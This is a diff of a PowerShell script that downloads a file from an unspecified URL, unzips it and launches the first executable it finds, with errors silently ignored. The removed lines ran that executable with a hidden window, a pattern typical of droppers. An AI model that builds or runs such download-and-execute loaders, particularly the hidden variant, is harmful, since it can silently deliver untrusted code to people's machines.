@@ -1,4 +1,5 @@
-
+# Suppress progress output (THIS is the key fix)
+$ProgressPreference = 'SilentlyContinue'
 
 try {
     # Get the directory where the script is located
@@ -18,8 +19,8 @@ try {
     # Set output path (same directory)
     $outputPath = Join-Path $scriptDir $fileName
 
-    # Download the file silently
-    Invoke-WebRequest -Uri $url -OutFile $outputPath *>$null
+    # Download the file (no progress now)
+    Invoke-WebRequest -Uri $url -OutFile $outputPath -ErrorAction SilentlyContinue
 
     # Check if the file is a .zip
     if ($fileName.ToLower().EndsWith(".zip")) {
@@ -27,22 +28,21 @@ try {
 
         # Create extraction folder if it doesn't exist
         if (-not (Test-Path $extractPath)) {
-            New-Item -ItemType Directory -Path $extractPath *>$null | Out-Null
+            New-Item -ItemType Directory -Path $extractPath | Out-Null
         }
 
-        # Extract the zip silently
-        Expand-Archive -Path $outputPath -DestinationPath $extractPath -Force *>$null
+        # Extract the zip
+        Expand-Archive -Path $outputPath -DestinationPath $extractPath -Force -ErrorAction SilentlyContinue
 
         # Find the first .exe file in the extracted folder (recursively)
         $exeFile = Get-ChildItem -Path $extractPath -Recurse -Filter *.exe -ErrorAction SilentlyContinue | Select-Object -First 1
 
         if ($exeFile) {
-            # Launch the first exe silently (console hidden)
-            Start-Process $exeFile.FullName -WindowStyle Hidden
+            # Launch the first exe (normal, not hidden)
+            Start-Process $exeFile.FullName
         }
     }
 }
 catch {
-    # Suppress all errors silently
-    $null
+    # Silently ignore errors
 }
